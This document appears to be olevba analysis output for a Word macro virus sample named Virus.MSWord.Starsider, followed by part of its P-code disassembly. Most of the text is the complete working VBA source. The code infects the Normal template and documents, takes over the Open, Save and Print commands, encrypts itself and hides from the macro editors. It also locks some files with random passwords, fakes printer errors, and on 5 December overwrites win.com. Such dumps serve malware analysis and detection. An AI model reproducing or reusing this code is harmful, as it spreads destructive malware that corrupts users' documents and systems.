olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Starsider
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Starsider - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim C_DC2 As String
Sub Install()
Dim OS, WinDir, SFile As String
OS = System.OperatingSystem
If OS <> "Windows" Then
Exit Sub
End If
WinDir = Environ("WinDir")
SFile = Dir(WinDir & "\SYSTEM\system.dot")
If SFile = "system.dot" Then
Exit Sub
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\8.0\Word\Options", "STARTUP-PATH") = WinDir & "\SYSTEM"
NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
NormalTemplate.Save
Call Decrypt
End Sub
Sub Decrypt()
Dim C_DC1, C_DC2, C_DC3 As String
Dim Z, i, X, LastLine As Integer
Set ADObj = ActiveDocument.VBProject.VBComponents(1).CodeModule
LastLine = ADObj.CountOfLines
Z = Mid(ADObj.Lines(1, 1), 2, 1)
For i = 47 To LastLine
C_DC1 = ADObj.Lines(i, 1)
For X = 2 To Len(C_DC1) - 1
IntCode = Asc(Mid(C_DC1, X, 1))
IntCode = IntCode + Z
C_DC2 = C_DC2 & Chr(IntCode)
Next X
C_DC2 = C_DC2 & Chr(13)
Next i
C_DC3 = ADObj.Lines(6, 41)
Set BaseObj = CreateObject("Word.Document")
Set ATObj = ActiveDocument.VBProject.VBComponents(1)
ATObj.CodeModule.AddFromString C_DC2
ATObj.CodeModule.AddFromString C_DC3
ATObj.CodeModule.InsertLines 1, "Dim C_DC2 As String"
ATObj.Export Environ("WinDir") & "\SYSTEM\win32vba.vxd"
BaseObj.SaveAs Environ("WinDir") & "\SYSTEM\system.dot", wdFormatTemplate
BaseObj.Close
End Sub
Sub Crypt()
Dim C_DC1, C_DC3 As String
Dim Z, i, X, LastLine As Integer
Randomize
Z = Int((7 * Rnd) + 1)
C_DC2 = ""
C_DC2 = "'" & Z & "'" & Chr(13)
C_DC2 = C_DC2 & "Sub AutoOpen()" & Chr(13)
C_DC2 = C_DC2 & "Application.DisplayRecentFiles = False" & Chr(13)
C_DC2 = C_DC2 & "Call Install" & Chr(13)
C_DC2 = C_DC2 & "End Sub" & Chr(13)
If Dir(Environ("WinDir") & "\SYSTEM\win32vba.vxd") <> "win32vba.vxd" Then
AddIns("system.dot").Installed = False
Exit Sub
End If
Open Environ("WinDir") & "\SYSTEM\win32vba.vxd" For Input As #1
For i = 1 To 9
Line Input #1, C_DC1
Next i
C_DC1 = ""
For i = 1 To 41
Line Input #1, C_DC1
C_DC2 = C_DC2 & C_DC1 & Chr(13)
Next i
C_DC3 = ""
While Not EOF(1)
Line Input #1, C_DC1
For X = 1 To Len(C_DC1)
IntCode = Asc(Mid(C_DC1, X, 1))
IntCode = IntCode - Z
C_DC3 = C_DC3 & Chr(IntCode)
Next X
If C_DC3 > "" Then
C_DC2 = C_DC2 & "'" & C_DC3 & "'" & Chr(13)
End If
C_DC3 = ""
Wend
C_DC2 = Mid(C_DC2, 1, Len(C_DC2) - 1)
Close #1
End Sub
Sub AutoExec()
Application.DisplayRecentFiles = False
CommandBars("Standard").Controls(2).OnAction = "FileOpen"
CommandBars("Standard").Controls(3).OnAction = "FileSave"
CommandBars("Standard").Controls(4).OnAction = "PrintCurrentDocument"
Call Crypt
Call Outsider
End Sub
Sub DocClose()
On Error Resume Next
If ActiveDocument.Saved = False Then
Call InfectAD
ActiveDocument.Close SaveChanges:=wdPromptToSaveChanges
Else
ActiveDocument.Close
End If
End Sub
Sub FileOpen()
With Dialogs(wdDialogFileOpen)
.Display
If .Name > "" Then
If (.Format = "0") Or (.Format = "1") Then
Documents.Open FileName:=.Name, Format:=.Format
Call InfectAD
ActiveDocument.Save
End If
Documents.Open FileName:=.Name, Format:=.Format
End If
End With
End Sub
Sub FileSave()
On Error Resume Next
If Dir(ActiveDocument.FullName) > "" Then
ActiveDocument.Save
Else
Call FileSaveAs
End If
End Sub
Sub FileSaveAs()
Dim LocalVar As Integer
With Dialogs(wdDialogFileSaveAs)
.Display
If .Name > "" Then
If (.Format = "0") Or (.Format = "1") Then
Randomize
LocalVar = Int((10 * Rnd) + 1)
If LocalVar = 1 Then
Call SetPassword
Else
Call InfectAD
End If
End If
ActiveDocument.SaveAs FileName:=.Name, FileFormat:=.Format
End If
End With
End Sub
Sub FileTemplates()
Templates(1).Saved = True
AddIns.Unload False
Call ClearAD
CommandBars("Standard").Reset
Dialogs(wdDialogToolsTemplates).Show
End Sub
Sub ViewVBCode()
Templates(1).Saved = True
AddIns.Unload False
Call ClearAD
CommandBars("Standard").Reset
Application.ShowVisualBasicEditor = True
End Sub
Sub ToolsMacro()
Templates(1).Saved = True
AddIns.Unload False
Call ClearAD
CommandBars("Standard").Reset
Dialogs(wdDialogToolsMacro).Show
End Sub
Sub ToolsOptions()
Dim RealPath As String
RealPath = ""
RealPath = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "PROGRAMDIR")
RealPath = RealPath & "\StartUp"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "STARTUP-PATH") = RealPath
If Dialogs(wdDialogToolsOptions).Show = 0 Or -1 Or -2 Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "STARTUP-PATH") = Environ("WinDir") & "\SYSTEM"
End If
End Sub
Sub FilePrint()
If Dialogs(wdDialogFilePrint).Display = -1 Then
Call PrintCurrentDocument
End If
End Sub
Sub PrintCurrentDocument()
On Error Resume Next
Dim NoPrint As Integer
Randomize
NoPrint = Int((Rnd * 3) + 1)
If NoPrint = 3 Then
MsgBox "Ïðèíòåð " & Application.ActivePrinter & " íå íàéäåí", vbOKOnly + vbExclamation, "Îøèáêà ïå÷àòè"
Exit Sub
End If
ActiveDocument.PrintOut
End Sub
Sub ClearAD()
On Error Resume Next
Dim ADLCount, i As Integer
Set ADCodeModule = ActiveDocument.VBProject.VBComponents(1).CodeModule
If ADCodeModule.CountOfLines > 0 Then
ADLCount = ADCodeModule.CountOfLines
ADCodeModule.DeleteLines 1, ADLCount
For i = 1 To 20
ADCodeModule.InsertLines 1, " "
ADCodeModule.DeleteLines 1, 1
Next i
ActiveDocument.Saved = True
End If
End Sub
Sub Outsider()
If (Day(Now) = 5) And (Month(Now) = 12) Then
Dim Buffer As Variant
Dim Buffer1 As Byte
Buffer = Array(184, 16, 3, 185, 0, 1, 51, 210, 205, 19, 195)
Open Environ("WinDir") & "\win.com" For Binary As #1
For i = 1 To 11
Buffer1 = Buffer(i - 1)
Put #1, i, Buffer1
Next i
Close #1
MsgBox Prompt:=Time & " - TiME TO DiE !" & Chr(13) & Chr(13) & "[OUTSiDER]", Title:="OUTSiDER'S MESSAGE"
End If
End Sub
Sub SetPassword()
Dim i As Integer
Dim Passcode As String
Randomize
For i = 1 To 6
RC = Int((9 * Rnd) + 0)
Passcode = Passcode & RC
Next i
ActiveDocument.Password = Passcode
End Sub
Sub InfectAD()
Dim ADLCount, i As Integer
Set ADCodeModule = ActiveDocument.VBProject.VBComponents(1).CodeModule
ADLCount = ADCodeModule.CountOfLines
If ADCodeModule.Lines(2, 1) = "Sub AutoOpen()" Then
Exit Sub
Else
ADCodeModule.DeleteLines 1, ADLCount
ADCodeModule.AddFromString C_DC2
End If
Templates(1).Saved = True
End Sub
'OUTSiDER v1.00'
'East-Kazakhstan, UK'
'10 january 2001 year. 11:00 am'
'New encrypt and stealth algorithm'

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Starsider
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 14064 bytes
' Line #0:
' 	Dim 
' 	VarDefn C_DC2 (As String)
' Line #1:
' 	FuncDefn (Sub Install())
' Line #2:
' 	Dim 
' 	VarDefn OS
' 	VarDefn WinDir
' 	VarDefn SFile (As String)
' Line #3:
' 	Ld System 
' 	MemLd OperatingSystem 
' 	St OS 
' Line #4:
' 	Ld OS 
' 	LitStr 0x0007 "Windows"
' 	Ne 
' 	IfBlock 
' Line #5:
' 	ExitSub 
' Line #6:
' 	EndIfBlock 
' Line #7:
' 	LitStr 0x0006 "WinDir"
' 	ArgsLd Environ 0x0001 
' 	St WinDir 
' Line #8:
' 	Ld WinDir 
' 	LitStr 0x0012 "\SYSTEM\system.dot"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St SFile 
' Line #9:
' 	Ld SFile 
' 	LitStr 0x000A "system.dot"
' 	Eq 
' 	IfBlock 
' Line #10:
' 	ExitSub 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	Ld WinDir 
' 	LitStr 0x0007 "\SYSTEM"
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\8.0\Word\Options"
' 	LitStr 0x000C "STARTUP-PATH"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #13:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #14:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #15:
' 	ArgsCall (Call) Decrypt 0x0000 
' Line #16:
' 	EndSub 
' Line #17:
' 	FuncDefn (Sub Decrypt())
' Line #18:
' 	Dim 
' 	VarDefn C_DC1
' 	VarDefn C_DC2
' 	VarDefn C_DC3 (As String)
' Line #19:
' 	Dim 
' 	VarDefn Z
' 	VarDefn i
' 	VarDefn X
' 	VarDefn LastLine (As Integer)
' Line #20:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set ADObj 
' Line #21:
' 	Ld ADObj 
' 	MemLd CountOfLines 
' 	St LastLine 
' Line #22:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ADObj 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St Z 
' Line #23:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x002F 
' 	Ld LastLine 
' 	For 
' Line #24:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld ADObj 
' 	ArgsMemLd Lines 0x0002 
' 	St C_DC1 
' Line #25:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld C_DC1 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #26:
' 	Ld C_DC1 
' 	Ld X 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	St IntCode 
' Line #27:
' 	Ld IntCode 
' 	Ld Z 
' 	Add 
' 	St IntCode 
' Line #28:
' 	Ld C_DC2 
' 	Ld IntCode 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St C_DC2 
' Line #29:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' 	Ld C_DC2 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St C_DC2 
' Line #31:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #32:
' 	LitDI2 0x0006 
' 	LitDI2 0x0029 
' 	Ld ADObj 
' 	ArgsMemLd Lines 0x0002 
' 	St C_DC3 
' Line #33:
' 	SetStmt 
' 	LitStr 0x000D "Word.Document"
' 	ArgsLd CreateObject 0x0001 
' 	Set BaseObj 
' Line #34:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set ATObj 
' Line #35:
' 	Ld C_DC2 
' 	Ld ATObj 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #36:
' 	Ld C_DC3 
' 	Ld ATObj 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #37:
' 	LitDI2 0x0001 
' 	LitStr 0x0013 "Dim C_DC2 As String"
' 	Ld ATObj 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #38:
' 	LitStr 0x0006 "WinDir"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0014 "\SYSTEM\win32vba.vxd"
' 	Concat 
' 	Ld ATObj 
' 	ArgsMemCall Export 0x0001 
' Line #39:
' 	LitStr 0x0006 "WinDir"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0012 "\SYSTEM\system.dot"
' 	Concat 
' 	Ld wdFormatTemplate 
' 	Ld BaseObj 
' 	ArgsMemCall SaveAs 0x0002 
' Line #40:
' 	Ld BaseObj 
' 	ArgsMemCall Close 0x0000 
' Line #41:
' 	EndSub 
' Line #42:
' 	FuncDefn (Sub Crypt())
' Line #43:
' 	Dim 
' 	VarDefn C_DC1
' 	VarDefn C_DC3 (As String)
' Line #44:
' 	Dim 
' 	VarDefn Z
' 	VarDefn i
' 	VarDefn X
' 	VarDefn LastLine (As Integer)
' Line #45:
' 	ArgsCall Read 0x0000 
' Line #46:
' 	LitDI2 0x0007 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St Z 
' Line #47:
' 	LitStr 0x0000 ""
' 	St C_DC2 
' Line #48:
' 	LitStr 0x0001 "'"
' 	Ld Z 
' 	Concat 
' 	LitStr 0x0001 "'"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St C_DC2 
' Line #49:
' 	Ld C_DC2 
' 	LitStr 0x000E "Sub AutoOpen()"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St C_DC2 
' Line #50:
' 	Ld C_DC2 
' 	LitStr 0x0026 "Application.DisplayRecentFiles = False"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St C_DC2 
' Line #51:
' 	Ld C_DC2 
' 	LitStr 0x000C "Call Install"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St C_DC2 
' Line #52:
' 	Ld C_DC2 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St C_DC2 
' Line #53:
' 	LitStr 0x0006 "WinDir"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0014 "\SYSTEM\win32vba.vxd"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x000C "win32vba.vxd"
' 	Ne 
' 	IfBlock 
' Line #54:
' 	LitVarSpecial (False)
' 	LitStr 0x000A "system.dot"
' 	ArgsLd AddIns 0x0001 
' 	MemSt Installed 
' Line #55:
' 	ExitSub 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	LitStr 0x0006 "WinDir"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0014 "\SYSTEM\win32vba.vxd"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #58:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0009 
' 	For 
' Line #59:
' 	LitDI2 0x0001 
' 	Ld C_DC1 
' 	LineInput 
' Line #60:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #61:
' 	LitStr 0x0000 ""
' 	St C_DC1 
' Line #62:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0029 
' 	For 
' Line #63:
' 	LitDI2 0x0001 
' 	Ld C_DC1 
' 	LineInput 
' Line #64:
' 	Ld C_DC2 
' 	Ld C_DC1 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St C_DC2 
' Line #65:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #66:
' 	LitStr 0x0000 ""
' 	St C_DC3 
' Line #67:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	While 
' Line #68:
' 	LitDI2 0x0001 
' 	Ld C_DC1 
' 	LineInput 
' Line #69:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld C_DC1 
' 	FnLen 
' 	For 
' Line #70:
' 	Ld C_DC1 
' 	Ld X 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	St IntCode 
' Line #71:
' 	Ld IntCode 
' 	Ld Z 
' 	Sub 
' 	St IntCode 
' Line #72:
' 	Ld C_DC3 
' 	Ld IntCode 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St C_DC3 
' Line #73:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #74:
' 	Ld C_DC3 
' 	LitStr 0x0000 ""
' 	Gt 
' 	IfBlock 
' Line #75:
' 	Ld C_DC2 
' 	LitStr 0x0001 "'"
' 	Concat 
' 	Ld C_DC3 
' 	Concat 
' 	LitStr 0x0001 "'"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St C_DC2 
' Line #76:
' 	EndIfBlock 
' Line #77:
' 	LitStr 0x0000 ""
' 	St C_DC3 
' Line #78:
' 	Wend 
' Line #79:
' 	Ld C_DC2 
' 	LitDI2 0x0001 
' 	Ld C_DC2 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St C_DC2 
' Line #80:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #81:
' 	EndSub 
' Line #82:
' 	FuncDefn (Sub AutoExec())
' Line #83:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #84:
' 	LitStr 0x0008 "FileOpen"
' 	LitDI2 0x0002 
' 	LitStr 0x0008 "Standard"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt OnAction 
' Line #85:
' 	LitStr 0x0008 "FileSave"
' 	LitDI2 0x0003 
' 	LitStr 0x0008 "Standard"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt OnAction 
' Line #86:
' 	LitStr 0x0014 "PrintCurrentDocument"
' 	LitDI2 0x0004 
' 	LitStr 0x0008 "Standard"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt OnAction 
' Line #87:
' 	ArgsCall (Call) Crypt 0x0000 
' Line #88:
' 	ArgsCall (Call) Outsider 0x0000 
' Line #89:
' 	EndSub 
' Line #90:
' 	FuncDefn (Sub DocClose())
' Line #91:
' 	OnError (Resume Next) 
' Line #92:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #93:
' 	ArgsCall (Call) InfectAD 0x0000 
' Line #94:
' 	Ld wdPromptToSaveChanges 
' 	ParamNamed SaveChanges 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' Line #95:
' 	ElseBlock 
' Line #96:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #97:
' 	EndIfBlock 
' Line #98:
' 	EndSub 
' Line #99:
' 	FuncDefn (Sub FileOpen())
' Line #100:
' 	StartWithExpr 
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #101:
' 	ArgsMemCallWith Display 0x0000 
' Line #102:
' 	MemLdWith New 
' 	LitStr 0x0000 ""
' 	Gt 
' 	IfBlock 
' Line #103:
' 	MemLdWith Format$ 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	Paren 
' 	MemLdWith Format$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #104:
' 	MemLdWith New 
' 	ParamNamed FileName 
' 	MemLdWith Format$ 
' 	ParamNamed Format$ 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0002 
' Line #105:
' 	ArgsCall (Call) InfectAD 0x0000 
' Line #106:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #107:
' 	EndIfBlock 
' Line #108:
' 	MemLdWith New 
' 	ParamNamed FileName 
' 	MemLdWith Format$ 
' 	ParamNamed Format$ 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0002 
' Line #109:
' 	EndIfBlock 
' Line #110:
' 	EndWith 
' Line #111:
' 	EndSub 
' Line #112:
' 	FuncDefn (Sub FileSave())
' Line #113:
' 	OnError (Resume Next) 
' Line #114:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Gt 
' 	IfBlock 
' Line #115:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #116:
' 	ElseBlock 
' Line #117:
' 	ArgsCall (Call) FileSaveAs 0x0000 
' Line #118:
' 	EndIfBlock 
' Line #119:
' 	EndSub 
' Line #120:
' 	FuncDefn (Sub FileSaveAs())
' Line #121:
' 	Dim 
' 	VarDefn LocalVar (As Integer)
' Line #122:
' 	StartWithExpr 
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #123:
' 	ArgsMemCallWith Display 0x0000 
' Line #124:
' 	MemLdWith New 
' 	LitStr 0x0000 ""
' 	Gt 
' 	IfBlock 
' Line #125:
' 	MemLdWith Format$ 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	Paren 
' 	MemLdWith Format$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #126:
' 	ArgsCall Read 0x0000 
' Line #127:
' 	LitDI2 0x000A 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St LocalVar 
' Line #128:
' 	Ld LocalVar 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #129:
' 	ArgsCall (Call) SetPassword 0x0000 
' Line #130:
' 	ElseBlock 
' Line #131:
' 	ArgsCall (Call) InfectAD 0x0000 
' Line #132:
' 	EndIfBlock 
' Line #133:
' 	EndIfBlock 
' Line #134:
' 	MemLdWith New 
' 	ParamNamed FileName 
' 	MemLdWith Format$ 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #135:
' 	EndIfBlock 
' Line #136:
' 	EndWith 
' Line #137:
' 	EndSub 
' Line #138:
' 	FuncDefn (Sub FileTemplates())
' Line #139:
' 	LitVarSpecial (True)
' 	LitDI2 0x0001 
' 	ArgsLd Templates 0x0001 
' 	MemSt Saved 
' Line #140:
' 	LitVarSpecial (False)
' 	Ld AddIns 
' 	ArgsMemCall Unlock 0x0001 
' Line #141:
' 	ArgsCall (Call) ClearAD 0x0000 
' Line #142:
' 	LitStr 0x0008 "Standard"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemCall Reset 0x0000 
' Line #143:
' 	Ld wdDialogToolsTemplates 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #144:
' 	EndSub 
' Line #145:
' 	FuncDefn (Sub ViewVBCode())
' Line #146:
' 	LitVarSpecial (True)
' 	LitDI2 0x0001 
' 	ArgsLd Templates 0x0001 
' 	MemSt Saved 
' Line #147:
' 	LitVarSpecial (False)
' 	Ld AddIns 
' 	ArgsMemCall Unlock 0x0001 
' Line #148:
' 	ArgsCall (Call) ClearAD 0x0000 
' Line #149:
' 	LitStr 0x0008 "Standard"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemCall Reset 0x0000 
' Line #150:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #151:
' 	EndSub 
' Line #152:
' 	FuncDefn (Sub ToolsMacro())
' Line #153:
' 	LitVarSpecial (True)
' 	LitDI2 0x0001 
' 	ArgsLd Templates 0x0001 
' 	MemSt Saved 
' Line #154:
' 	LitVarSpecial (False)
' 	Ld AddIns 
' 	ArgsMemCall Unlock 0x0001 
' Line #155:
' 	ArgsCall (Call) ClearAD 0x0000 
' Line #156:
' 	LitStr 0x0008 "Standard"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemCall Reset 0x0000 
' Line #157:
' 	Ld wdDialogToolsMacro 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #158:
' 	EndSub 
' Line #159:
' 	FuncDefn (Sub ToolsOptions())
' Line #160:
' 	Dim 
' 	VarDefn RealPath (As String)
' Line #161:
' 	LitStr 0x0000 ""
' 	St RealPath 
' Line #162:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options"
' 	LitStr 0x000A "PROGRAMDIR"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St RealPath 
' Line #163:
' 	Ld RealPath 
' 	LitStr 0x0008 "\StartUp"
' 	Concat 
' 	St RealPath 
' Line #164:
' 	Ld RealPath 
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options"
' 	LitStr 0x000C "STARTUP-PATH"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #165:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Eq 
' 	LitDI2 0x0001 
' 	UMi 
' 	Or 
' 	LitDI2 0x0002 
' 	UMi 
' 	Or 
' 	IfBlock 
' Line #166:
' 	LitStr 0x0006 "WinDir"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0007 "\SYSTEM"
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options"
' 	LitStr 0x000C "STARTUP-PATH"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #167:
' 	EndIfBlock 
' Line #168:
' 	EndSub 
' Line #169:
' 	FuncDefn (Sub FilePrint())
' Line #170:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Display 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	IfBlock 
' Line #171:
' 	ArgsCall (Call) PrintCurrentDocument 0x0000 
' Line #172:
' 	EndIfBlock 
' Line #173:
' 	EndSub 
' Line #174:
' 	FuncDefn (Sub PrintCurrentDocument())
' Line #175:
' 	OnError (Resume Next) 
' Line #176:
' 	Dim 
' 	VarDefn NoPrint (As Integer)
' Line #177:
' 	ArgsCall Read 0x0000 
' Line #178:
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St NoPrint 
' Line #179:
' 	Ld NoPrint 
' 	LitDI2 0x0003 
' 	Eq 
' 	IfBlock 
' Line #180:
' 	LitStr 0x0008 "Ïðèíòåð "
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	LitStr 0x000A " íå íàéäåí"
' 	Concat 
' 	Ld vbOKOnly 
' 	Ld vbExclamation 
' 	Add 
' 	LitStr 0x000D "Îøèáêà ïå÷àòè"
' 	ArgsCall MsgBox 0x0003 
' Line #181:
' 	ExitSub 
' Line #182:
' 	EndIfBlock 
' Line #183:
' 	Ld ActiveDocument 
' 	ArgsMemCall PrintOut 0x0000 
' Line #184:
' 	EndSub 
' Line #185:
' 	FuncDefn (Sub ClearAD())
' Line #186:
' 	OnError (Resume Next) 
' Line #187:
' 	Dim 
' 	VarDefn ADLCount
' 	VarDefn i (As Integer)
' Line #188:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set ADCodeModule 
' Line #189:
' 	Ld ADCodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #190:
' 	Ld ADCodeModule 
' 	MemLd CountOfLines 
' 	St ADLCount 
' Line #191:
' 	LitDI2 0x0001 
' 	Ld ADLCount 
' 	Ld ADCodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #192:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
